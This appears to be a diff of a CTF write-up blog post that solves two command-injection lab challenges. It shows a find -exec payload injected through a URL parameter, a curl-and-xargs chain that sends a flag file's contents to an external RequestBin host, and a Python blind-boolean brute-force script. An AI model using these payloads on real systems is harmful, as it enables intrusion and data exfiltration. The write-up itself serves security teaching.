@@ -370,6 +370,8 @@ Can't quite read it so we'll take a look in the source. Why is the Reddit link f
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce8-000.png)
 
+Try it.
+
 ```
 http://127.0.0.1:8088/index.php?user=mike&submit=Scan
 ```
@@ -386,7 +388,7 @@ http://127.0.0.1:8088/index.php?user=*&submit=Scan
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce8-002.png)
 
-The error message is from the `find` command, a huge clue as to how this works. I'm not familiar with this particular error and found [the advice](https://stackoverflow.com/questions/6495501/find-paths-must-precede-expression-how-do-i-specify-a-recursive-search-that) to try using quotes after Google'ing the error.
+The error message is from the `find` command, a huge clue as to how this works. I'm not familiar with this particular error and found [some advice](https://stackoverflow.com/questions/6495501/find-paths-must-precede-expression-how-do-i-specify-a-recursive-search-that) via Google'ing to use quotes.
 
 ```
 http://127.0.0.1:8088/index.php?user=%22*%22&submit=Scan
@@ -394,11 +396,45 @@ http://127.0.0.1:8088/index.php?user=%22*%22&submit=Scan
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce8-003.png)
 
-Well then! 
+Well then! Based on the use of the `find` command, we can guess the way this directory works is by having a file named after each user.
+
+Set up a local POC with some empty files and names from the list above.
+
+```
+root@kali ~/A/c/08# ls
+Sam  Shannon  Sophia
+```
+
+We'll assume the `find` command used by the application is simple and just appends the user input to the end. Trying some tests,
+
+```
+root@kali ~/A/c/08# find . -name Sam
+./Sam
+root@kali ~/A/c/08# find . -name "*"
+.
+./Sophia
+./Shannon
+./Sam
+```
+
+Not exactly the same output formatting as the web application, but it works.
+
+`find` can take a number of different actions on matching items, outlined pretty well in the ACTIONS section of the [man page](https://linux.die.net/man/1/find). One action is to run an arbitrary command on matching files using `-exec`.
+
+The command we'll run is to `cat` the flag to the matched file (Sam). The following will match Sam and then execute `cat /tmp/flag.txt Sam`
+
+```
+root@kali ~/A/c/08# find . -name Sam -exec cat /tmp/flag.txt {} +
+localPOCflag
+```
+
+So our payload is,
 
 ```
 Sam -exec cat /tmp/flag.txt {} +
 ```
+
+For some reason this challenge is especially sensitive to URL encoding. To avoid problems I've encoded all non-alpha characters in the payload.
 
 ```
 http://127.0.0.1:8088/index.php?user=Sam%20-exec%20cat%20%2Ftmp%2Fflag.txt%20%7B%7D%20%2B&submit=Scan
@@ -406,4 +442,139 @@ http://127.0.0.1:8088/index.php?user=Sam%20-exec%20cat%20%2Ftmp%2Fflag.txt%20%7B
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce8-004.png)
 
+Woo.
+
 # Challenge 9
+
+![RCE Cornucopia](/img/rce-cornucopia/rce9-000.png)
+
+Test run.
+
+```
+http://127.0.0.1:8089/index.php?url=example.com&string=coordination&submit=Scan
+```
+
+![RCE Cornucopia](/img/rce-cornucopia/rce9-001.png)
+
+## Solution 1 - Web Request
+
+We'll assume the application, like previous challenges, is coded in a very straightforward way using `curl` and `grep`. Something like `curl <URL> | grep <string>` followed by some logic to check whether anything was matched.
+
+Note that `curl` can be used to read fetch a local file.
+
+```
+root@kali ~/A/c/09# curl file:///tmp/flag.txt
+flag{localPOCflag}
+```
+
+Let's try that online, search for 'flag' in the URL `file:///tmp/flag.txt` since we know it will be there.
+
+```
+http://127.0.0.1:8089/index.php?url=file%3A%2F%2F%2Ftmp%2Fflag.txt&string=flag&submit=Scan
+```
+
+![RCE Cornucopia](/img/rce-cornucopia/rce9-003.png)
+
+By design, the application requests a page on the Internet that we specify and searches it for a string. What if we use a domain under our control and include the flag value in the URL? Something like `http://attacker.hax/<flag>`.
+
+There's a project called [RequestBin](https://github.com/Runscope/requestbin) that provides you a tokenized URL and access to a panel which shows all requests made to that URL. Unforunately "the" RequestBin has been taken offline due to abuse, but if you Google you can find another one that's up or host your own. 
+
+For the moment I'll use [https://requestbin.fullcontact.com/](https://requestbin.fullcontact.com/). My bin URL is `http://requestbin.fullcontact.com/1m06f111`
+
+Quick POC,
+
+```
+root@kali ~/A/c/09# curl http://requestbin.fullcontact.com/1m06f111/flagflagflag
+ok
+```
+
+![RCE Cornucopia](/img/rce-cornucopia/rce9-002.png)
+
+If we can get the actual flag value into the URL in place of 'flagflagflag' we're set.
+
+To do this we'll `curl` the file into `xargs` and use that to build a second `curl` command which will hit RequestBin. `xargs` can take piped input and place it in the text of other commands.
+
+Our local POC,
+
+```
+root@kali ~/A/c/09# curl file:///tmp/flag.txt | grep flag | xargs -I {} curl http://requestbin.fullcontact.com/1m06f111/{}
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    19  100    19    0     0  19000      0 --:--:-- --:--:-- --:--:-- 19000
+ok
+```
+
+![RCE Cornucopia](/img/rce-cornucopia/rce9-004.png)
+
+Success!
+
+Now for the real deal. Search the URL `file:///tmp/flag.txt` for the string `flag | xargs -I {} curl http://requestbin.fullcontact.com/1m06f111/{}`
+
+```
+http://127.0.0.1:8089/index.php?url=file%3A%2F%2F%2Ftmp%2Fflag.txt&string=flag+%7C+xargs+-I+%7B%7D+curl+http%3A%2F%2Frequestbin.fullcontact.com%2F1m06f111%2F%7B%7D&submit=Scan
+```
+
+![RCE Cornucopia](/img/rce-cornucopia/rce9-005.png)
+
+And check RequestBin,
+
+![RCE Cornucopia](/img/rce-cornucopia/rce9-006.png)
+
+Success.
+
+## Solution 2 - Blind Boolean
+
+This challenge can be solved without requiring unlimited outbount Internet access from the web server. What if there was a whitelist of domains or it could only be used internally on a local network? 
+
+We can do this by guessing each character from front to back. We know the flag starts with `flag{` and can check for that. We'll ask, does it start with `flag{a`? or `flag{b`? or `flag{c`? and so on... Once the first letter is found (we'll look for a 'Yaaaaaassssss' in the response to determine this), repeat the same for the next character, and so on.
+
+Some quick and dirty Python I used when the challenge was still hosted online for the AppSec USA CTF (URL removed),
+
+```{% raw %}
+import socket, urllib
+
+HOST = "<url removed>"
+PORT = 80
+REQU = """GET /index.php?url=file%3A%2F%2F%2Ftmp%2Fflag.txt&string={}&submit=Scan HTTP/1.1
+Host: <url removed>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: <url removed>
+Connection: close\r\n\r\n"""
+ALPH = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
+
+def corn9(guess):
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((HOST, PORT))
+
+	x = "-e '^flag{%s'" % (guess)
+	s.send(REQU.format(urllib.quote_plus(x)))
+	r = s.recv(8192)
+	s.close()
+	
+	if "Yaaaaaassssss" in r:
+		return True
+	return False
+
+p = ''
+for i in xrange(64):
+	f = False
+	for c in ALPH:
+		print p, c
+		if corn9(p + c):
+			f = True
+			p = p + c
+			break
+	if not f:
+		break
+
+print "DONE"
+print p
+{% endraw %}```
+
+Here it is running, fun to watch it go once things are working.
+
+<https://www.youtube.com/watch?v=b186X-as8tM>
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/b186X-as8tM" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
